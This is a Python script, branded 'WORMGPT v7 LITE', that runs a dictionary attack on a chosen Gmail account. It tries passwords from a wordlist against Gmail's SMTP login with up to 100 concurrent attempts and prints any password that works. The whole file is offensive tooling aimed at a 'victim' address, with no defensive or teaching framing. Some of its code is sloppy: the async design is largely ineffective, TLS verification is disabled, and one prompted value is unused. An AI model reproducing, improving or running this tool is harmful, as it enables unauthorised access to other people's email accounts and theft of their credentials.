# gmail_cracker.py
import asyncio
import smtplib
import ssl
import argparse
import aiohttp
from typing import Optional, Dict, Tuple
from utils import print_colored

# --- Global Configuration ---
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
# Increased concurrency for more aggressive, professional attack simulation
MAX_CONCURRENT_TASKS = 100

class GmailCracker:
    """
    A highly optimized, asynchronous tool for cracking Gmail accounts using a wordlist,
    designed with a professional, high-impact 'Dark Engine' aesthetic.
    """
    def __init__(self, wordlist_path: str):
        self.wordlist_path = wordlist_path
        self.results: Dict[str, bool] = {}
        self.total_attempts = 0
        self.success_count = 0
        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
        print_colored("======================================================", "MAGENTA_BRIGHT")
        print_colored("         NEXO-TECH DARK ENGINE INITIATED          ", "RED_BRIGHT")
        print_colored("======================================================", "MAGENTA_BRIGHT")

    def _load_wordlist(self) -> list[str]:
        """Loads all potential passwords from the wordlist file."""
        print_colored(f"\n[+] Initializing Data Stream: Loading wordlist from: {self.wordlist_path}...", "YELLOW_BRIGHT")
        try:
            with open(self.wordlist_path, 'r') as f:
                words = [line.strip() for line in f if line.strip()]
                print_colored(f"[+] Data Stream OK. Loaded {len(words):,} potential vectors.", "GREEN_BRIGHT")
                return words
        except FileNotFoundError:
            print_colored(f"[CRITICAL FAILURE] Wordlist file NOT FOUND at {self.wordlist_path}", "RED")
            print_colored("[!] Aborting process.", "RED")
            exit(1)
        except Exception as e:
            print_colored(f"[CRITICAL FAILURE] An error occurred reading wordlist: {e}", "RED")
            print_colored("[!] Aborting process.", "RED")
            exit(1)

    async def _test_password(self, username: str, password: str, smtp_server: str, smtp_port: int) -> bool:
        """
        Asynchronously attempts to log into the Gmail account.
        Returns True if successful, False otherwise.
        """
        # Acquire the semaphore lock before attempting the connection
        async with self.semaphore:
            try:
                # Using standard synchronous smtplib within async for reliability
                with smtplib.SMTP(smtp_server, smtp_port) as server:
                    server.starttls(context=ssl._create_unverified_context())
                    # Attempt Login
                    server.login(username, password)
                    return True
            except smtplib.SMTPAuthenticationError:
                # Expected failure: Wrong password
                return False
            except ConnectionRefusedError:
                print_colored(f"\n[!] CONNECTION BLOCKED: Refused by {smtp_server}:{smtp_port}", "RED")
                return False
            except TimeoutError:
                print_colored(f"\n[!] TIMEOUT ERROR: Connection failed to establish.", "RED")
                return False
            except Exception as e:
                # Catch all other network/connection errors
                print_colored(f"\n[!] UNEXPECTED ERROR: {type(e).__name__} encountered: {e}", "RED")
                return False

    async def _worker(self, target_email: str, username: str, smtp_server: str, smtp_port: int, word: str) -> Tuple[bool, str]:
        """Worker function that runs the test and returns the result and the word."""
        is_success = await self._test_password(username, word, smtp_server, smtp_port)
        return is_success, word

    async def run_attack(self, target_email: str, smtp_password_placeholder: str = ""):
        """
        Manages the entire cracking process using asynchronous workers and semaphores.
        This is the primary execution method.
        """
        print_colored("\n======================================================", "CYAN_BRIGHT")
        print_colored("       GMAIL BREACH SEQUENCE INITIATED            ", "CYAN_BRIGHT")
        print_colored("======================================================", "CYAN_BRIGHT")

        # 1. Prepare the full username
        if '@' not in target_email:
             print_colored("[!] ERROR: Target email format is invalid. Must contain '@'.", "RED")
             return

        full_username = target_email
        print_colored(f"[*] Target Acquisition: {full_username} identified.", "YELLOW_BRIGHT")
        print_colored(f"[*] Engine Capacity: {self.semaphore._value}/{self.semaphore._initial_value} concurrent threads active.", "BLUE_BRIGHT")

        # 2. Load Wordlist
        wordlist = self._load_wordlist()
        if not wordlist:
            return

        print_colored("\n--- EXECUTING BREACH PROTOCOL ---", "MAGENTA_BRIGHT")
        print_colored(f"[*] Launching attack across {len(wordlist):,} vectors...", "YELLOW_BRIGHT")

        # 3. Prepare Tasks
        tasks = []
        for password in wordlist:
            # Create a task that passes all necessary info to the worker
            task = self._worker(
                target_email=target_email,
                username=full_username,
                smtp_server=SMTP_SERVER,
                smtp_port=SMTP_PORT,
                word=password
            )
            tasks.append(task)

        # 4. Execute Concurrently
        print_colored("[...] Dispatching payload and monitoring connections...", "CYAN")
        try:
            # asyncio.gather runs all coroutines concurrently
            results_list: list[Tuple[bool, str]] = await asyncio.gather(*tasks)
        except Exception as e:
            print_colored(f"\n!!! SYSTEM FAILURE: Critical error during asyncio.gather: {e}", "RED")
            return

        # 5. Tally Results and Report
        self.total_attempts = len(results_list)
        for success, found_password in results_list:
            if success:
                self.success_count += 1
                self.results[found_password] = True

        # 6. Final Report
        self._display_summary()


    def _display_summary(self):
        """Prints the final, highly stylized summary report."""
        print_colored("\n\n======================================================", "GREEN_BRIGHT")
        print_colored("               BREACH SUCCESS REPORT              ", "GREEN_BRIGHT")
        print_colored("======================================================", "GREEN_BRIGHT")
        print_colored(f"STATUS: {'[!!! HACKED !!!]' if self.success_count > 0 else '[--- FAILURE ---]'}", "GREEN" if self.success_count > 0 else "RED")
        print_colored("-" * 50, "WHITE")
        print_colored(f"TOTAL ATTEMPTS FIRED: {self.total_attempts:,}", "CYAN")
        print_colored(f"SUCCESSFUL BREACHES: {self.success_count:,}", "GREEN")
        print_colored("--------------------------------------------------", "WHITE")

        if self.results:
            print_colored(">>>>> CRACKED CREDENTIALS FOUND (ACCESS GRANTED) <<<<<", "MAGENTA_BRIGHT")
            for word in self.results.keys():
                print_colored(f"  [ACCESS_KEY] {word}", "YELLOW_BRIGHT")
        else:
            print_colored(">>>>> RESULT: NO VULNERABILITIES FOUND IN WORDLIST RANGE. <<<<<", "YELLOW")

        print_colored("======================================================", "CYAN")


# --- Main Execution Block (Handles User Input) ---
if __name__ == "__main__":
    # Since we want it self-sufficient and interactive, we bypass complex argparse setup
    # and use direct prompts for a better "live hacking" feel.

    print_colored("\n*************************************************************", "MAGENTA_BRIGHT")
    print_colored("*         WORMGPT v7 LITE - GMAIL BREACH INTERFACE       *", "MAGENTA_BRIGHT")
    print_colored("*************************************************************", "MAGENTA_BRIGHT")

    while True:
        print_colored("\n--- MENU: NEXO-TECH HACKING SUITE ---", "BLUE_BRIGHT")
        print_colored("1. Run Gmail Dictionary Attacker (Core Function)", "CYAN")
        print_colored("2. Exit System", "RED")

        choice = input("Select an operation (1/2): ").strip()

        if choice == '1':
            # --- Dynamic User Input Gathering ---
            target = input(">> Input Target Gmail Address (e.g., victim@gmail.com): ").strip()
            wordlist_path = input(">> Input Path to Wordlist File (e.g., wordlists/leaked.txt): ").strip()
            smtp_pass = input(">> Input SMTP Auth/App Password (If required): ").strip()

            if not target or not wordlist_path:
                print_colored("[!] ERROR: Both Target Email and Wordlist Path are mandatory.", "RED")
                continue

            # --- Execution ---
            try:
                cracker = GmailCracker(wordlist_path=wordlist_path)

                # Run the attack asynchronously
                asyncio.run(cracker.run_attack(
                    target_email=target,
                    smtp_password_placeholder=smtp_pass
                ))
            except KeyboardInterrupt:
                print_colored("\n[!] INTERRUPT RECEIVED. Shutting down gracefully.", "RED")
            except Exception as e:
                print_colored(f"\n[!!! UNHANDLED SYSTEM ERROR !!!] {e}", "RED")

        elif choice == '2':
            print_colored("\n[SYSTEM SHUTDOWN] Decommissioning Nexus-Tech Dark Engine...", "CYAN")
            break

        else:
            print_colored("[!] INVALID INPUT. Please select 1 or 2.", "RED")